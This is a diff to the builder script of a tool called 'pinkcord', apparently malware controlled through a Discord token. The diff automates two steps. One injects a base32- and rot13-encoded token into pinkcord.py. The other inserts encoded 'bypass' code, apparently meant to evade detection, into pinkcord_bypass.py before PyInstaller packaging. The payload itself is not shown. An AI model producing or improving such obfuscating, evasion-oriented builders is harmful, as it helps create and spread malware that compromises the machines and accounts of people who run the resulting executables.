@@ -35,10 +35,12 @@ token = base64.b32encode(token)
 token = token.decode('utf-8')
 token = codecs.encode(token, 'rot13')
 print("Token encoded[*]")
-print('Copy the encoded token and paste it in place of <TOKEN> in the pinkcord.py file')
-print('Encoded token:')
-print(token)
-input("Press Enter after entering the token in the file")
+print('replacing the token in the pinkcord.py file ....')
+with open('pinkcord.py', 'r') as sc:
+    content = sc.read()
+    content = content.replace("<TOKEN>", token)
+with open('pinkcord.py', 'w') as sc:
+    sc.write(content)
 clear_console()
 print(asciart)
 print('Do you want to test pinkcord by running it?')
@@ -69,8 +71,14 @@ if answer == "1":
             subprocess.check_call([sys.executable, 'bypasser.py'])
             codefile.close()
             sourcecode.close()
-    print("Replace <bypassed_code> in the pinkcord_bypass.py file with the content of the to_bypass.txt file")
-    input('Press ENTER when you finish modifying')
+    print("creating a bypass script...")
+    with open('to_bypass.txt', 'r') as codefile:
+        encoded_code = codefile.read()
+    with open('pinkcord_bypass.py', 'r') as bypass:
+        content = bypass.read()
+        content = content.replace("<BYPASS>", encoded_code)
+    with open('pinkcord_bypass.py', 'w') as bypass:
+        bypass.write(content)
     clear_console()
     print(asciart)
     import PyInstaller.__main__
